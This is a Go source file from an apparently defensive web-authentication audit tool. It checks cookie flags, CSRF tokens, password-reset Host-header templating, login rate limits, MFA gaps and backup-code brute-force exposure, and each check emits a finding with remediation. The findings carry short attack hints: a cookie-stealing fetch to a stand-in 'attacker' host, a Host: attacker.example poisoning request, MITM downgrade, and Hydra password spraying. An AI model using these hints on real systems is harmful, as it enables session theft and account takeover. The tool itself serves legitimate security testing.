// Package webauth implements attacks against web authentication flows:
// cookie attribute audit, CSRF detection, password-reset poisoning, login
// rate-limit detection, 2FA enforcement gaps, and backup-code brute surface.
//
// All checks are local — they consume a Set-Cookie header / an HTTP
// response body / a URL and emit findings. They do not contact a remote
// service other than through the supplied input.
package webauth

import (
	"fmt"
	"net/http"
	"strings"

	"github.com/apophis-eng/apophis/internal/models"
)

// AttackVector identifies the web-auth attack category.
type AttackVector string

const (
	VectorCookieMissingSecure   AttackVector = "cookie-missing-secure"
	VectorCookieMissingHttpOnly AttackVector = "cookie-missing-httponly"
	VectorCookieMissingSameSite AttackVector = "cookie-missing-samesite"
	VectorCookiePredictable     AttackVector = "cookie-predictable"
	VectorCSRFMissing           AttackVector = "csrf-missing"
	VectorCSRFWeak              AttackVector = "csrf-weak"
	VectorResetHostHeader       AttackVector = "password-reset-host-header"
	VectorLoginNoRateLimit      AttackVector = "login-no-rate-limit"
	VectorLoginNoLockout        AttackVector = "login-no-lockout"
	VectorMFAEnforcementGap     AttackVector = "mfa-enforcement-gap"
	VectorBackupCodeBrute       AttackVector = "backup-code-brute"
)

// F wraps models.Finding.
func F(vector AttackVector, title, target string, sev models.Severity, evidence, desc, exploit, remediation string) models.Finding {
	return models.Finding{
		Title:       title,
		Severity:    sev,
		Category:    "WebAuthAttack",
		Target:      target,
		Evidence:    evidence,
		Description: desc,
		Exploit:     exploit,
		Remediation: remediation,
		Tags:        []string{"auth-attack", "web-auth", string(vector)},
	}
}

// --- Cookie attribute audit -----------------------------------------------

// CookieAudit inspects every Set-Cookie header in a response. The names
// that look like session cookies (PHPSESSID, JSESSIONID, ASP.NET_SessionId,
// connect.sid, etc.) get a deeper audit; all cookies get the basics.
func CookieAudit(target string, headers http.Header, cookieNames []string) []models.Finding {
	findings := []models.Finding{}
	for _, raw := range headers.Values("Set-Cookie") {
		c := parseSetCookie(raw)
		if c.Name == "" {
			continue
		}
		sev := models.SeverityLow
		if isSensitiveCookie(c.Name, cookieNames) {
			sev = models.SeverityHigh
		}
		if !c.Secure && isSensitiveCookie(c.Name, cookieNames) {
			findings = append(findings, F(
				VectorCookieMissingSecure,
				fmt.Sprintf("Cookie %q on %s missing Secure flag", c.Name, target),
				target,
				sev,
				"set_cookie="+raw,
				"The session cookie is set without the Secure flag. It can be transmitted over plain HTTP, allowing a network attacker to read it via a downgrade attack.",
				"Run an http-only MITM (e.g. ssltrip + arp spoof) and capture the cookie from the next request.",
				"Set Secure on every session cookie. Combine with HSTS to prevent the cookie from ever being sent over HTTP.",
			))
		}
		if !c.HTTPOnly && isSensitiveCookie(c.Name, cookieNames) {
			findings = append(findings, F(
				VectorCookieMissingHttpOnly,
				fmt.Sprintf("Cookie %q on %s missing HttpOnly flag", c.Name, target),
				target,
				sev,
				"set_cookie="+raw,
				"The cookie is set without HttpOnly, so client-side JavaScript can read it. Any XSS on the page exfiltrates the session.",
				"Inject a script: fetch('https://attacker/?c='+document.cookie).",
				"Set HttpOnly on every session cookie. Move tokens that client-side code needs to localStorage or use the new Storage Access API.",
			))
		}
		if c.SameSite == "" && isSensitiveCookie(c.Name, cookieNames) {
			findings = append(findings, F(
				VectorCookieMissingSameSite,
				fmt.Sprintf("Cookie %q on %s missing SameSite attribute", c.Name, target),
				target,
				models.SeverityMedium,
				"set_cookie="+raw,
				"Without SameSite=Lax or Strict, the cookie is sent on cross-site requests, enabling CSRF attacks against state-changing endpoints.",
				"Craft a cross-origin form POST that mutates state; the cookie is attached, the request succeeds.",
				"Set SameSite=Lax (or Strict for highly sensitive endpoints) on every session cookie.",
			))
		}
		// Path=/ — overly broad scope.
		if c.Path == "/" && isSensitiveCookie(c.Name, cookieNames) {
			findings = append(findings, F(
				VectorCookieMissingSecure,
				fmt.Sprintf("Cookie %q on %s has overly broad scope (/). Consider scoping to /path", c.Name, target),
				target,
				models.SeverityInfo,
				"set_cookie="+raw,
				"The cookie is set with Path=/, exposing it to every endpoint on the origin. Tighter scoping limits lateral movement after a token leak.",
				"Capture the cookie from any endpoint; replay against /api/* and /admin/* on the same origin.",
				"Scope session cookies to the minimum path they need.",
			))
		}
	}
	return findings
}

// --- CSRF detection -------------------------------------------------------

// CSRFCheck inspects a login / state-change form for the presence and
// strength of a CSRF token. body is the raw HTML body of the page.
// expectedParam is the form parameter name the CSRF token should appear in
// (e.g. "csrf_token", "_csrf", "authenticity_token").
func CSRFCheck(target, body, expectedParam string) []models.Finding {
	if body == "" || expectedParam == "" {
		return nil
	}
	findings := []models.Finding{}
	lower := strings.ToLower(body)
	if !strings.Contains(lower, strings.ToLower(expectedParam)) {
		findings = append(findings, F(
			VectorCSRFMissing,
			fmt.Sprintf("CSRF token missing on %s (expected param %q)", target, expectedParam),
			target,
			models.SeverityHigh,
			fmt.Sprintf("param=%s not found in body", expectedParam),
			"The form lacks a CSRF token. State-changing requests from a victim's browser will succeed without consent.",
			"Craft a cross-origin form POST and submit it from a victim's browser.",
			"Include a per-session, cryptographically random CSRF token in every state-changing form. Verify on the server.",
		))
		return findings
	}
	// Cheap strength check: token value should be long enough.
	val := extractAttr(lower, expectedParam, "value")
	if len(val) < 16 {
		findings = append(findings, F(
			VectorCSRFWeak,
			fmt.Sprintf("CSRF token too short on %s (param %s, len %d)", target, expectedParam, len(val)),
			target,
			models.SeverityMedium,
			fmt.Sprintf("param=%s value_len=%d", expectedParam, len(val)),
			"The CSRF token is shorter than 16 characters — brute-forceable.",
			"Replay 2^N requests with random tokens; once one matches, the CSRF protection is bypassed.",
			"Use ≥128 bits of entropy per CSRF token. Tie the token to the session id.",
		))
	}
	return findings
}

// --- Password reset Host header injection --------------------------------

// ResetHostHeaderCheck inspects a password-reset form / endpoint for two
// things: (a) whether the reset URL is built from the user-supplied Host
// header (an attacker can poison it via Host: attacker.example), and (b)
// whether the form / action is reachable over HTTPS.
func ResetHostHeaderCheck(target, action, currentHost string) []models.Finding {
	if action == "" {
		return nil
	}
	findings := []models.Finding{}
	if strings.HasPrefix(strings.ToLower(action), "http://") {
		findings = append(findings, F(
			VectorResetHostHeader,
			fmt.Sprintf("Password reset action is plain HTTP on %s (%s)", target, action),
			target,
			models.SeverityMedium,
			fmt.Sprintf("action=%s current_host=%s", action, currentHost),
			"The reset link in the email is built from the user-supplied Host header and is plain HTTP. A network attacker can rewrite it on the fly and capture the token from the URL.",
			"Use ssltrip or downgrade the link to HTTP in transit; the reset token is captured in the URL bar.",
			"Build the reset link from a server-configured host (not the request Host), and force HTTPS via HSTS.",
		))
	}
	if currentHost != "" && (strings.Contains(action, "{HOST}") || strings.Contains(action, "<host>")) {
		findings = append(findings, F(
			VectorResetHostHeader,
			fmt.Sprintf("Password reset URL template uses Host header on %s (%s)", target, action),
			target,
			models.SeverityCritical,
			fmt.Sprintf("action=%s current_host=%s", action, currentHost),
			"The reset URL is templated with the request's Host header. An attacker who can modify the Host header (via a proxy, a misconfigured frontend, or an open-redirect on a sibling host) controls the reset link.",
			"Send a request with Host: attacker.example to the reset endpoint; the email contains https://attacker.example/reset?token=…",
			"Never use the request Host in URLs emitted to users. Use a configured `RESET_LINK_BASE` env var instead.",
		))
	}
	return findings
}

// --- Login rate-limit / lockout detection --------------------------------

// RateLimitCheck reports whether the supplied response (status, retry-after,
// body) suggests the endpoint rate-limits or locks out after failed logins.
// `priorFailures` is the number of failed POSTs the auditor issued.
func RateLimitCheck(target string, status int, retryAfter string, body string, priorFailures int) []models.Finding {
	if priorFailures < 3 {
		return nil
	}
	if status == http.StatusTooManyRequests || status == 429 {
		return nil // we observed rate-limiting
	}
	if retryAfter != "" {
		return nil
	}
	// Lockout-specific patterns.
	bodyLower := strings.ToLower(body)
	if strings.Contains(bodyLower, "locked") || strings.Contains(bodyLower, "too many attempts") || strings.Contains(bodyLower, "temporarily disabled") {
		return nil
	}
	if priorFailures >= 5 {
		return []models.Finding{F(
			VectorLoginNoRateLimit,
			fmt.Sprintf("No rate-limit / lockout on login endpoint %s after %d failures", target, priorFailures),
			target,
			models.SeverityHigh,
			fmt.Sprintf("status=%d retry_after=%q failures=%d", status, retryAfter, priorFailures),
			"After five failed logins the server returned a normal status (no 429, no Retry-After, no 'locked' message). A password-spray campaign against this endpoint is unconstrained.",
			"Continue spraying passwords; lockout will not engage.",
			"Implement per-account (and per-IP) rate limiting on the login endpoint. Add exponential backoff and account lockout after 10 failed attempts in 15 minutes.",
		)}
	}
	return []models.Finding{F(
		VectorLoginNoLockout,
		fmt.Sprintf("No account lockout observed on %s after %d failed logins", target, priorFailures),
		target,
		models.SeverityMedium,
		fmt.Sprintf("status=%d failures=%d", status, priorFailures),
		"The login endpoint does not lock accounts after multiple failed attempts. Combined with a weak password policy, this enables brute-force.",
		"Run Hydra / Patator against the endpoint with the targeted spray wordlist.",
		"Implement account lockout (or rate limiting) on the login endpoint.",
	)}
}

// --- 2FA enforcement gap -------------------------------------------------

// MFAFingerprint is the result of probing the endpoint for MFA enforcement.
type MFAFingerprint struct {
	HasMFA        bool     // page returned by the auditor after a successful password step has an MFA prompt
	MFAParameters []string // form parameters associated with the MFA step (e.g. "otp", "code")
}

// MFAEnforcementGap reports whether the auth flow skips MFA on sensitive
// endpoints. The auditor supplies the post-password page body and a list of
// "sensitive" sub-paths that should require MFA (e.g. "/admin", "/wire",
// "/api/v1/users").
func MFAEnforcementGap(target, pageBody string, sensitiveSubpaths []string, fingerprint MFAFingerprint) []models.Finding {
	if fingerprint.HasMFA || pageBody == "" {
		return nil
	}
	// We flag a gap only when at least one sensitive subpath is configured.
	if len(sensitiveSubpaths) == 0 {
		return nil
	}
	return []models.Finding{F(
		VectorMFAEnforcementGap,
		fmt.Sprintf("No MFA enforcement on sensitive path(s) on %s", target),
		target,
		models.SeverityHigh,
		fmt.Sprintf("sensitive=%v mfa_present=%v params=%v", sensitiveSubpaths, fingerprint.HasMFA, fingerprint.MFAParameters),
		"The endpoint accepts a password without a subsequent MFA step. Sensitive paths (admin, wire transfer, etc.) should require MFA by policy; an attacker who phishes the password gains full access without the second factor.",
		"Phish the password; complete the login; observe that the sensitive action is reachable without MFA.",
		"Require MFA (TOTP, WebAuthn, push) on every sensitive subpath. Audit logs to ensure MFA is enforced, not just available.",
	)}
}

// --- Backup code brute surface --------------------------------------------

// BackupCodeSurface reports the risk that an attacker can brute the backup
// codes (the static fallback codes issued when MFA is enrolled).
//
// Most providers issue 8-10 backup codes of 8-10 digits each. The space is
// 10^8 ≈ 100M possibilities per code, with N codes = 10^8 / N chance per
// attempt. Many providers do NOT rate-limit backup-code entry.
func BackupCodeSurface(target string, codesIssued int, codeLength int, observedNoRateLimit bool) []models.Finding {
	if codesIssued == 0 {
		return nil
	}
	if !observedNoRateLimit {
		return nil
	}
	// Rough estimate: each guess has 1 / (10^codeLength) chance of hitting
	// one of the codesIssued codes. The "average guesses" is (10^L) / codesIssued.
	space := 1
	for i := 0; i < codeLength; i++ {
		space *= 10
	}
	avgGuesses := space / codesIssued
	sev := models.SeverityHigh
	if avgGuesses > 1_000_000 {
		sev = models.SeverityMedium
	}
	if avgGuesses > 100_000_000 {
		sev = models.SeverityLow
	}
	return []models.Finding{F(
		VectorBackupCodeBrute,
		fmt.Sprintf("Backup-code brute surface on %s (avg %.0f guesses per success)", target, float64(avgGuesses)),
		target,
		sev,
		fmt.Sprintf("codes=%d length=%d observed_no_rate_limit=%v", codesIssued, codeLength, observedNoRateLimit),
		"Backup codes (typically 8-10 digits) are checked by the auth flow without rate-limiting. The expected number of guesses to find a valid code is small enough to brute-force.",
		"Spray backup codes against the endpoint; expect a hit within seconds for code lengths ≤ 8 digits.",
		"Rate-limit backup code entry; require the user's primary MFA factor (TOTP/WebAuthn) when >2 backup codes have been consumed; invalidate backup codes after 5 failed attempts.",
	)}
}

// --- helpers --------------------------------------------------------------

type parsedCookie struct {
	Name     string
	Value    string
	Path     string
	Domain   string
	Expires  string
	MaxAge   string
	Secure   bool
	HTTPOnly bool
	SameSite string
}

func parseSetCookie(raw string) parsedCookie {
	c := parsedCookie{}
	parts := strings.Split(raw, ";")
	if len(parts) > 0 {
		first := strings.SplitN(parts[0], "=", 2)
		if len(first) == 2 {
			c.Name = strings.TrimSpace(first[0])
			c.Value = strings.TrimSpace(first[1])
		}
	}
	for _, p := range parts[1:] {
		p = strings.TrimSpace(p)
		lower := strings.ToLower(p)
		switch {
		case lower == "secure":
			c.Secure = true
		case lower == "httponly":
			c.HTTPOnly = true
		case strings.HasPrefix(lower, "samesite="):
			c.SameSite = strings.TrimSpace(p[len("SameSite="):])
		case strings.HasPrefix(lower, "path="):
			c.Path = strings.TrimSpace(p[len("Path="):])
		case strings.HasPrefix(lower, "domain="):
			c.Domain = strings.TrimSpace(p[len("Domain="):])
		}
	}
	return c
}

var sensitiveCookieNames = []string{
	"sess", "session", "sid", "sessionid", "jsessionid", "phpsessid",
	"asp.net_sessionid", "cfid", "cftoken", "remember_me", "rememberme",
	"csrf", "xsrf", "_csrf", "authenticity_token", "access_token", "id_token",
	"jwt", "bearer", "apophis_session",
}

func isSensitiveCookie(name string, custom []string) bool {
	lower := strings.ToLower(name)
	for _, c := range append(sensitiveCookieNames, custom...) {
		if lower == c || strings.Contains(lower, c) {
			return true
		}
	}
	return false
}

func extractAttr(body, param, attr string) string {
	lower := body
	idx := strings.Index(lower, param)
	if idx < 0 {
		return ""
	}
	end := idx + 256
	if end > len(lower) {
		end = len(lower)
	}
	segment := lower[idx:end]
	ai := strings.Index(segment, attr+"=\"")
	if ai < 0 {
		ai = strings.Index(segment, attr+"='")
		if ai < 0 {
			return ""
		}
		ai += len(attr) + 2
		ei := strings.Index(segment[ai:], "'")
		if ei < 0 {
			return ""
		}
		return segment[ai : ai+ei]
	}
	ai += len(attr) + 2
	ei := strings.Index(segment[ai:], "\"")
	if ei < 0 {
		return ""
	}
	return segment[ai : ai+ei]
}
